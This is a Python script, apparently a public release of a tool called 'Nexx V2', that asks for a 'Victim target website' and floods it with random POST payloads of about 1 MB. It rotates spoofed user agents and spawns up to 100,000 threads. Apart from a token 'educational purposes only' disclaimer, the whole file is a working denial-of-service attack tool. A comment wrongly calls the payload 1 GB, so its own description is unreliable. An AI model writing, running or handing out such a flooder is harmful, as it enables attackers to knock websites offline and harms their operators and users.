import requests
import threading
import random
import string
import os
import time

os.system("color 5")

print("""
░█▄░█▒██▀░▀▄▀░▀▄▀░░▒█▀▄░█▒█░██▄░█▒░░█░▄▀▀
░█▒▀█░█▄▄░█▒█░█▒█▒░░█▀▒░▀▄█▒█▄█▒█▄▄░█░▀▄▄

""")


def intro():
    print("THIS IS USED FOR EDUCATIONAL PURPOSES ONLY. WE ARE NOT RESPONSIBLE FOR HOW YOU USE THIS. NEXX V2 IS NOT RESPONIBLE FOR HOW USE IT")
    time.sleep(2)
    print("Nex V2 Is Entering your pc :)")
    time.sleep(2)
   

intro()

# Function to gather website URL and additional information
def gather_info():
    website_url = input("Enter the Victim target website >:) ")
    # You can add more input prompts here to gather additional information, such as login credentials or specific endpoints
    return website_url

# Function to send a massive amount of requests to the target URL
def attack():
    while True:
        try:
            # Crafting a random user-agent to mimic different users
            user_agent = generate_user_agent()
            headers = {'User-Agent': user_agent}

            # Sending a POST request with a large payload to the target URL
            payload = generate_payload()
            response = requests.post(target_url, headers=headers, data=payload)
            print("Request sent to:", target_url)
        except requests.exceptions.RequestException as e:
            print(e)

# Function to generate a random user-agent
def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
    ]
    # Adding 100 more user agents
    for _ in range(100):
        user_agents.append(generate_random_user_agent())
    return random.choice(user_agents)

# Function to generate a random user-agent
def generate_random_user_agent():
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0." + ''.join(random.choices(string.digits, k=3)) + " Safari/537.36"

# Function to generate a large payload
def generate_payload():
    payload = "".join(random.choices(string.ascii_letters + string.digits, k=1000000))  # Generating 1 GB payload
    return payload

# Number of threads to run simultaneously
num_threads = 100000  # A large number of threads for faster requests

# Target website URL
target_url = gather_info()

# Creating and starting threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    threads.append(thread)

for thread in threads:
    thread.start()

# Waiting for all threads to complete
for thread in threads:
    thread.join()
